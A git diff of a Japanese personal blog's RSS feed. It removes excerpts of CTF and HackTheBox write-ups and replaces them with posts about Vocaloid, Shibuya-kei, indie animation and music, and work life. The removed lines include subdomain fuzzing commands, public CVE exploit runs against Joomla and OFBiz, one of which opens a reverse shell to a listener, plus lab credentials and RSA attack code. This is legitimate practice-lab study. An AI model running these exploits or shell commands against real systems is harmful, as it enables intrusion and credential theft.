@@ -5,121 +5,138 @@
     <link>http://side-realms.github.io/</link>
     <description>Recent content on お茶は綾鷹派</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 10 Sep 2024 20:28:52 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <language>ja-jp</language>
+    <lastBuildDate>Sat, 14 Dec 2024 01:49:51 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>AutomotiveCTF</title>
-      <link>http://side-realms.github.io/writeup/automotivectf/</link>
-      <pubDate>Tue, 10 Sep 2024 20:28:52 +0900</pubDate>
+      <title>ボカロ - シングル</title>
+      <link>http://side-realms.github.io/misc/vocaloid/</link>
+      <pubDate>Sat, 14 Dec 2024 01:49:51 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/automotivectf/</guid>
-      <description>automotiveCTF に参加しました． 30/382, 14/143 でした． 初めてチームで参加していました (!?)．
-自分が解いた or 関わった問題だけ writeup を書きます．
-# writeup 書こうと思ったら問題サーバが一日足らずで閉じていたので (!?) 覚えている範囲だけです
-OSINT Scanning Plates ナンバープレートを検索するとリトアニアの記事がでてきます． なので答えはリトアニア
-I know a lot about cars google photo で検索するとランボルギーニの記事が出てきます． 型も一緒に出てくるのでこれがこたえ
-We&amp;rsquo;ll see in the Mach-E ログファイルが渡されて，どの通りを通っていた？とかどのラジオを聴いていた？とかの質問に答えます． 頑張ってログを眺めて答えを見つけます．つらい．．．
-DID Access 0x4915 で調べる
-What is the VIN? Ford のマスタングなので VIN は 3FM から始まります． これで頑張って探す
-Street Names ログを眺めると ~~dr みたいな記述があるのでこれをデコード
-When were we driving? ログを眺めると 2024 みたいな記述があります． これを含む行だけ抜き出すとよい. 良い感じにデコードして日付のフォーマットになるものを抜き出す
-Steering Angle ほぼ勘</description>
+      <guid>http://side-realms.github.io/misc/vocaloid/</guid>
+      <description>ボカロはシングルが主戦場なので異常量のナイスソングがある． 個人的趣味を全てここにダンプする． 随時更新．
+拝啓、最高の思い出たち 映像がカワイイ．これくらい緩くていいんだよ
+天国 Mayakashi 晴天のスヌーズ フルまだですか？
+新興宗教 「同窓会」もいいが，新興宗教のインパクトがデカい
+sui 構築している 春びらき id 残花、夏を見ていた 青の肖像 守れない約束の交わし方 リーフバック 沸点 祟リ遊ビ 妖人 cicada ここ数年の推しP． 全てがすっと飲み込める
+▷コンティニュー ディフレイル ねこふんじゃった． 映像がヤバい．
+ピカリラ morning glow 異形ヲ啖ふ 片方だけが燃えている 洗脳チックに教育して 魔法少女幸福論を思い出しました
+ハードモードじゃ頑張れない スペースバニー +8 生命 いっぱいキャパシティ コラージュ 蒙昧 バレてたらどうしよう もう、溶けた。 クリエイト･リ/ムーブ シロクロアノニマス ＊･ﾟ+｡園にて.ﾟ キリンに日がさせば 夏空とコントレイル 引力の根源 トレードオフ 奈奈落落 バベル とっ散らかるサマー あの夏の旋律へ 一人でいたい Devil&amp;rsquo;s Devil 少しずつ、音 ピエロクラウンマスコット シャカ ハレーション バブル えんぴつキャップをわすれちゃった 大抵探索 今この瞬間でしか作れない音楽 Recollect グレア ロストダンサー アマリリス 海底電光 純白の記憶 心拍ペアリング room エンドロールによろしく アクラシア 蒼と海鳥 ポリネーション 離解できない </description>
     </item>
     
     <item>
-      <title>LITCTF2024</title>
-      <link>http://side-realms.github.io/writeup/litctf2024/</link>
-      <pubDate>Tue, 13 Aug 2024 23:18:46 +0900</pubDate>
+      <title>渋谷系</title>
+      <link>http://side-realms.github.io/misc/animesong/</link>
+      <pubDate>Tue, 03 Dec 2024 00:48:43 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/litctf2024/</guid>
-      <description>Crypto simple otp 与えられた鍵と XOR する
-import random encoded_with_xor = b&amp;#39;\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a&amp;#39; random.seed(0) key = random.randbytes(32) #print(key ^ encoded_with_xor) print(bytes(a ^ b for a, b in zip(key, encoded_with_xor))) privatekey N = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209 e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319 c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206 e がデカい
-import owiener from Crypto.Util.number import * e = ... n = ... c = ... d = owiener.attack(e, n) print(&amp;#34;d={}&amp;#34;.format(d)) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) pope shuffle it&amp;rsquo;s like caesar cipher but better.</description>
+      <guid>http://side-realms.github.io/misc/animesong/</guid>
+      <description>高野寛 渋谷系として一番最初に好きになったがあまりアルバムは追えていない
+Flipper&amp;rsquo;s Guitar ダサい英語がかっこいい
+小沢健二 色々やってるがこれが好き
+Cornelius FANTASMA は渋谷系だと思わない．
+original love 「これって original love なんだ」が多い． やっぱり結晶が好きだな
+Bridge ラヴ・タンバリンズ L⇔R Nelories VENUS PETER SPIRAL LIFE </description>
     </item>
     
     <item>
-      <title>Cryptohack2</title>
-      <link>http://side-realms.github.io/writeup/cryptohack2/</link>
-      <pubDate>Sun, 09 Jun 2024 20:08:31 +0900</pubDate>
+      <title>2024 よかった新譜</title>
+      <link>http://side-realms.github.io/misc/2024/</link>
+      <pubDate>Sat, 30 Nov 2024 06:49:54 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/cryptohack2/</guid>
-      <description>Structure of AES def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) Round Key def add_round_key(s, k): for i in range(4): for j in range(4): state[i][j] = state[i][j] ^ round_key[i][j] return (state) print(matrix2bytes(add_round_key(state, round_key))) Confusion through Substitution from Crypto.Util.number import long_to_bytes def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) def sub_bytes(s, sbox=s_box): for i in range(4): for j in range(4): tmp = str(hex(s[i][j]))[2:] #print(tmp[0]) s[i][j] = sbox[int(tmp, base=16)] return(state) Diffusion through Permutation def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] inv_mix_columns(state) inv_shift_rows(state) print(matrix2bytes(state)) Bringing It All Together N_ROUNDS = 10 key = b&amp;#39;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&amp;#39; ciphertext = b&amp;#39;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&amp;#39; s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) def bytes2matrix(text): return [list(text[i:i+4]) for i in range(0, len(text), 4)] def matrix2bytes(matrix): out = [] for r in matrix: for c in r: out.</description>
+      <guid>http://side-realms.github.io/misc/2024/</guid>
+      <description>イヤ～今年は豊作ですね（毎年言ってる）
+バンド名もアルバムの名前も入ってないジャケットが増えてるように感じる． マジでかっこいいと思う． ジャケットは Tyler the creator，Real Estate，Almost Monday が好き．
+ありきたりだが Real Estate と half alive を一番聴いたな
+しろつめ備忘録 Homecomings ハンバート ハンバート Hedigan&amp;rsquo;s Charli xcx Geordie Greep ジャスティス 柴田聡子 half・alive Tyler the creator w.o.d BUMP OF CHICKEN 喃語 Ginger root パソコン音楽クラブ NIKO NIKO TAN TAN Michael Kaneko Floating Points Fontaines D.C. Caribou 折坂悠太 Porter Robinson Real Estate Vampire Weekend んoon 長谷川白紙 Tempalay MONO NO AWARE Clairo Bleachers uku kasai Khalid Kroi ドミコ Cage the Elephant Foster the People Glass Animals Almost Monday WONK Aooo COIN Friko </description>
     </item>
     
     <item>
-      <title>HTB_devvortex</title>
-      <link>http://side-realms.github.io/writeup/htb_devvortex/</link>
-      <pubDate>Sat, 08 Jun 2024 15:25:30 +0900</pubDate>
+      <title>インディーアニメーションにハマっている</title>
+      <link>http://side-realms.github.io/other/animation/</link>
+      <pubDate>Sun, 27 Oct 2024 03:54:35 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/htb_devvortex/</guid>
-      <description>user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &amp;quot;Host: FUZZ.devvortex.htb&amp;quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&amp;gt; Customise(Cassiopeia) を編集する error.</description>
+      <guid>http://side-realms.github.io/other/animation/</guid>
+      <description>最近は YouTube でインディーズのアニメーションを見るのが好きです． DIY 感が大好きだったのですが，最近のものはお金もかかっていてメジャー級のアニメーションとクオリティが大差ないですね． 違うのは持久力くらいでしょうか
+失われた朝食 https://www.youtube.com/watch?v=rtcH5k2-fLM
+キューライスの作品ですが，自分がインディーズアニメにハマるきっかけになった動画です． 見れば分かるように強迫性観念を描いたアニメで，作者インタビューでも同じようなことが言われています． キューライスの絵はカワイイので見やすいですが，BGM や SE がリアルで結構怖い． 自分で作っているらしいです．
+DOUBLE KING https://www.youtube.com/watch?v=w_MSFkZHNi4
+オーストラリア出身の Felix Colgrave の中ではおそらく一番人気のあるアニメで，朗らかな BGM，SE，イラスト，に反して内容はなかなかコアだと思います． このサイケ感なかなかないと思いますし BGM も素晴らしい
+純粋な心で考察すると「人間の際限ない欲望ってアカンよね」みたいな話になりますが，う～んという感じだ．．．
+The Sharpest Blade Ever https://www.youtube.com/watch?v=qRDj7fJkI4c
+刀身がない剣の話． 実際は別次元に刀身だけ存在していて，みたいな話．
+効果音が最高なんですよ．．． すごくミニマルな音なんだが，音楽とも差別化してあって聴きやすい
+結局この刀が止まった生き物が一番強い&amp;hellip;ってコト!?
+Stupid Dinner https://www.youtube.com/watch?v=2LQ9iasdc7Q
+このパースのくずれ方とかマジでいいんだよな． オチが結構あっさりしていて，こういうの大好物です
+cat city https://www.youtube.com/watch?v=NWeyUpqnKuk
+同じ作者だが，この人は話がどうよりも圧倒的にかわいい絵とアニメーションで見たくなる． 人間ぶってる猫かわいすぎなんですよね
+Star Watcher https://www.youtube.com/watch?v=TYkAxD1Ouck
+なにこれ？
+超適当な絵に見えるが，やってることはクオリティ高いし，どうやっているのか想像つかない（自分がアニメーションをやっていないからだと思うが．．．）． というかこの絵も常人には書けない
+教訓？とか何にもなくてただ面白い映像をたくさん提供してくれる． この製作者をパクった動画もたくさん生まれており，人気の高さがうかがえます(小並)
+Krabi https://www.youtube.com/watch?v=igROsVAk7fY
+これなんですよ，世間が求めているものは．．．
+ロボカニが自分を生み出すアニメーションかわいい． 貼り絵っぽいけどこの時代のアニメーションってどうなってるんだろうな
+科学者がやっているのは，人為的に進化を作ることで最強の兵器を作ろうという計画． で，どんどん強いカニがあらわれるが，結局最終的に自分たちが作ったカニにやられるっていう話． 戦争の自殺性を描いている．
+Resilience https://www.youtube.com/watch?v=F1QRZki3zb8
+戦争みたいな人為的な破壊があっても自然が回復 (Resilience) する様子が書かれている．
+Scavengers https://www.youtube.com/watch?v=1TRzemJbUsw</description>
     </item>
     
     <item>
-      <title>HTB: Bizness</title>
-      <link>http://side-realms.github.io/writeup/htb_bizness/</link>
-      <pubDate>Wed, 05 Jun 2024 04:49:04 +0900</pubDate>
+      <title>社会人一年目 議事録</title>
+      <link>http://side-realms.github.io/other/new/</link>
+      <pubDate>Sat, 28 Sep 2024 00:15:48 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/htb_bizness/</guid>
-      <description>user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490.</description>
+      <guid>http://side-realms.github.io/other/new/</guid>
+      <description>最初に この文章は何の意味もなく，個人の偏見であり，燃えさしです． 社会人 1 年目の内省を雑にダンプすることが目的であり，誰かに何かを伝えたいわけでも，何かを主張したいわけでもありません． 思いついたら追記していくので 1 年くらいかけて書く
+読書 通勤時の環境音や広告，雑踏みたいな，容量を埋めるばかりで 1 銭にもならない情報を大量に受け入れるのに耐えられなくなったため(早い)，電車内の 3 h を使って読書をするようになりました． 疲労が深いときは電車と人に酔うので毎回読めるわけではありませんが，いい娯楽の一つになっています． いろんなジャンルを読んでみようと思っていますが，今のところミステリ・ハードボイルド・新書だけでした．
+健康診断 A 判定ではない． 痩せすぎ + 赤血球多すぎ． 水を飲みましょう．
+Vtuber ぽこピーと轟京子，おむらいす食堂を日常的に見ている． 無理に Vtuber としての体裁を繕わない雰囲気が性に合う．
+にじさんじはあまり熱心に見ていない． ジョー力一と idios，黒井しばを睡眠導入にしている．
+あおぎり高校は熱心に見ている． ガチ恋営業は現実と創作の境目が迷子になるので苦手だが，最近はバラエティの感覚が戻ってきて嬉しい．
+セキュリティのスタートアップ 技術は道具だと思っているので，技術力の高さで人間の順位をつける雰囲気はあまり好きではない(CTF のような競技形式をもつイベントはその限りではない)． そのため，具体的な名前は出さないが，一部のセキュリティのスタートアップは性に合わない． Twitter で暴れる有名人は無視していればいい． 実力も運のうちです
+品川駅 意外と食事のコスパがいい．電車の発着でワイヤレスイヤホンが途切れる．地元より治安が良い．駅前の政治色が強い．
+Twitter お気に入りアカウント Tattoos I would get if I had money
+PokémonHttps
+ダク俣
+毎日キレる斑鳩ルカ
+飲み会 楽しいです． でもなかなか自分から誘う勇気はないなあと思っています． まあ誰しも誘って断られたらしんどい&amp;hellip;
+ソフトせんべい 20 枚 120 円． 朝食にちょうどいい．
+ソルトレイク CCS ワークショップの ASHES に論文が通ったためソルトレイクまで出張した． 治安は比較的良い．乾燥している．アジア系が多い？</description>
     </item>
     
     <item>
-      <title>HTB: Beginner</title>
-      <link>http://side-realms.github.io/writeup/beginner/</link>
-      <pubDate>Fri, 24 May 2024 21:22:04 +0900</pubDate>
+      <title>愛．．．なインディーズ</title>
+      <link>http://side-realms.github.io/misc/indies/</link>
+      <pubDate>Sun, 15 Sep 2024 19:54:49 +0900</pubDate>
       
-      <guid>http://side-realms.github.io/writeup/beginner/</guid>
-      <description>HTB, しばらくやってなかったらアカウント忘れてしまった
-新しくアカウントを作って starting point も終えたので，やっていきたい
-Weak RSA from Crypto.PublicKey import RSA pubkey = RSA.importKey(open(&amp;#34;key.pub&amp;#34;).read()) e = pubkey.e n = pubkey.n print(&amp;#34;e :&amp;#34;, e) print(&amp;#34;n :&amp;#34;, n) これで e, n を計算する． e が巨大なので以下のように攻撃する
-import owiener from Crypto.Util.number import * e = 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 n = 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 d = owiener.attack(e, n) if d is None: print(&amp;#34;Failed&amp;#34;) else: print(&amp;#34;d={}&amp;#34;.format(d)) with open(&amp;#39;flag.enc&amp;#39;, &amp;#39;rb&amp;#39;) as ct: sc = bytes_to_long(ct.read()) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) Jerry nmap: http-proxy 8080 ip:8080 にアクセスする tomcat が開いている /manager/html が管理画面っぽい デフォルトパスワードをブルートフォースすると tomcat:s3cret で通る .</description>
-    </item>
-    
-    <item>
-      <title>Lame</title>
-      <link>http://side-realms.github.io/writeup/lame/</link>
-      <pubDate>Wed, 22 May 2024 21:27:57 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/lame/</guid>
-      <description>user enum4linux Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME tmp で anonymous ログインができる ファイルを見てみたがよく分からなかった vmware の authlog のようなものがある samba 3.0.20 がある metasploit で調べると exploit が見つかる 刺さる root metasploit の exploit で root ログインだったので root も手に入れた </description>
-    </item>
-    
-    <item>
-      <title>Rev を雑多に解く1</title>
-      <link>http://side-realms.github.io/writeup/rev_1/</link>
-      <pubDate>Mon, 06 May 2024 05:03:30 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/rev_1/</guid>
-      <description>SECCON Beginners 2023 Half strings で見える
-ctf4b{ge4_t0_kn0w_the_bin4ry_fi1e_with_s4ring3}
-Three length = strlen(input); if (length == 0x31) { for (local_c = 0; local_c &amp;lt; 0x31; local_c = local_c + 1) { if (local_c % 3 == 0) { cVar1 = (char)*(undefined4 *)(flag_0 + (long)(local_c / 3) * 4); } else if (local_c % 3 == 1) { cVar1 = (char)*(undefined4 *)(flag_1 + (long)(local_c / 3) * 4); } else { cVar1 = (char)*(undefined4 *)(flag_2 + (long)(local_c / 3) * 4); } if (cVar1 !</description>
-    </item>
-    
-    <item>
-      <title>Cryptohack1</title>
-      <link>http://side-realms.github.io/writeup/cryptohack/</link>
-      <pubDate>Sat, 04 May 2024 22:10:33 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/cryptohack/</guid>
-      <description>Encoding Challenge from pwn import * # pip install pwntools import json import base64 import codecs r = remote(&amp;#39;socket.cryptohack.org&amp;#39;, 13377) def json_recv(): line = r.recvline() return json.loads(line.decode()) def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request) def decoding(types, received): if(types == &amp;#34;base64&amp;#34;): answer = base64.b64decode(received).decode() return answer if(types == &amp;#34;hex&amp;#34;): answer = str(bytes.fromhex(received)) return answer[2:len(answer)-1] if(types == &amp;#34;rot13&amp;#34;): answer = codecs.encode(received, &amp;#39;rot_13&amp;#39;) return answer if(types == &amp;#34;bigint&amp;#34;): answer = str(bytes.fromhex(received[2:])) return answer[2:len(answer)-1] if(types == &amp;#34;utf-8&amp;#34;): answer = &amp;#34;&amp;#34; for i in received: answer += chr(i) return answer while (True): received = json_recv() print(&amp;#34;Received type: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;type&amp;#34;]) print(&amp;#34;Received encoded value: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;encoded&amp;#34;]) answer = decoding(received[&amp;#34;type&amp;#34;], received[&amp;#34;encoded&amp;#34;]) print(&amp;#34;answer: &amp;#34;, end=&amp;#34;&amp;#34;) print(answer) to_send = {&amp;#34;decoded&amp;#34;: answer} request = json.</description>
-    </item>
-    
-    <item>
-      <title>picoCTF - web</title>
-      <link>http://side-realms.github.io/writeup/picoweb/</link>
-      <pubDate>Thu, 02 May 2024 10:39:24 +0900</pubDate>
-      
-      <guid>http://side-realms.github.io/writeup/picoweb/</guid>
-      <description>なかなか初心者を抜け出せないので，量をこなそう作戦
-解いたことがある問題は記載しない
-WebDecode 開発者ツール的なので About ページを見ると怪しい文字列があるので，base64 デコード
-Intro to Burp アカウントを作ると OTP を求められる． リクエストの otp= を消してリクエストを送ると OK
-curl -X POST http://titan.picoctf.net:54630/dashboard -H &#39;Cookie: session=.eJxdjDkOwyAUBe9CnQIwi8llEBhQkA0fsciKotw9tKSct8wHHbG_0RPFMybIgB7oaDXoDqfPMxZSWYUp3VwQnOzMcUbMrri1WAbiFSaUGSnU_IVxXTqb5Bcb9DKZ4U1wPrGY1m6obtmUF2Sv80jW16UYzdc_4_cH_-A4Iw.ZjLzXA.osPDJuPjvfZFlwhe-7dVDbKhZj0&#39;
-Unminify 開発者ツールを見る
-Trickster 画像をアップロードできる． アップロードできる系はシェルが通りそうなことを HTB で学んだのでやってみる．
-User-agent: * Disallow: /instructions.txt Disallow: /uploads/ robots.txt から /uploads/ にアップロードした画像が置いてあるような気がする． また，X-Powered-By を見れば PHP 製であることが分かるので，PHP が通る．
-さらに instructions.txt を見ると，ut wikipedia says that the first few bytes contain &#39;PNG&#39; in hexadecimal: &amp;quot;50 4E 47&amp;quot; ) みたいに書いてあるので， 50 4E 47 -&amp;gt; PNG が書いてあればいいんだと思う</description>
+      <guid>http://side-realms.github.io/misc/indies/</guid>
+      <description>インディーズ，マジで掘り出し物しかない． 一生やってる骨董市みたいな感じ． サブスクのおかげで気軽に掘れるようになって本当にありがたい
+まだ商業的な意識がない状態の音楽はその人の考え方とか音の捉え方が直に表れる感じがする． 温故知新ではあるけど新しいインディーズも十分に今の音楽シーンを支えていると思う．
+備忘録的にかなりハマったインディーズのアーティストを書き留めていく． おススメのアーティストがいれば随時連絡しなさい．
+ちなみにインディーズの定義はよく分かっていない． ロックバンドに限る，みたいな意見もあるけど今回はジャンル混ぜ混ぜで自分が勝手にインディーズっぽいと思っているバンドを集めた
+「これインディーズじゃないだろ！」みたいな意見もあると思いますが勘弁してください． そこまで深く考えて書いてないです
+幽体コミュニケーションズ 「beat my spring!!!」の衝撃はすごい．．． シンセサイザーのすごさはあるんだけどギターの音作りもイケてる． メロディの親しみやすさと展開の面白さのバランスいい
+ボーカルがピーナッツくんに似てるよね
+ウ山あまね 聴いたことない音しか出せない人間． 順当に作ればすごく聴きやすい曲のはずなのに音が異常なせいで最高の曲になってしまっている
+kurayamisaka シューゲイザーを聴くきっかけになったバンド．．． ジャケ写で敬遠してたけど聴いてよかった．
+このアルバムは高校生の女の子二人が卒業を境に離れ離れになっちゃうよ，っていうことを永遠に歌ってるんだが これがまたいい．．． 友達ってこうだよな．．．という気持ちと，つらいね．．．っていう気持ちが両立する．
+公式の解説ブログもありますし，俺の貧弱感想とかどうでもいいのでとりあえずこれを見ながら聴いてください
